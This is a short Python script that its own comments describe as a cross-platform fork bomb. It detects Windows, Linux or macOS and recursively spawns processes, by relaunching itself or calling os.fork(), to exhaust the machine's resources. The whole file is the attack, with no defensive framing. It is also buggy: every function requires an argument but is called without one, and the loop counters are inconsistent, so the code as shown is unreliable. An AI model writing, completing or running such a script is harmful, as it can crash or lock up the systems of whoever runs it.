#!/usr/bin/env python3

## >>
## Imports some Modules.
## >>

import subprocess
import sys
import time
import random
import os
import platform

## >>
## Sets the Variables for Operating System name and the number for the while loop.
## >>

opsys = platform.system()
i = 0

## >>
## Defines the fork bomb functions for the various Operating Systems.
## >>

def forkbombwin(i):
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
    while i != 6:
        i += 1
        forkbombwin()
        if i == 6:
            break
def forkbomblin(i):
    os.fork()
    while i != 6:
        i += 6
        forkbomblin()
        if i == 6:
            break
def forkbombmac(i):
    os.fork()
    while i != 6:
        i += 6
        forkbombmac()
        if i == 6:
            break
## >>
## Checks for the Operating System name and executes the right function.
## >>

if opsys == "Windows":
    forkbombwin()
if opsys == "Linux":
    forkbomblin()
if opsys == "Darwin":
    forkbombmac()
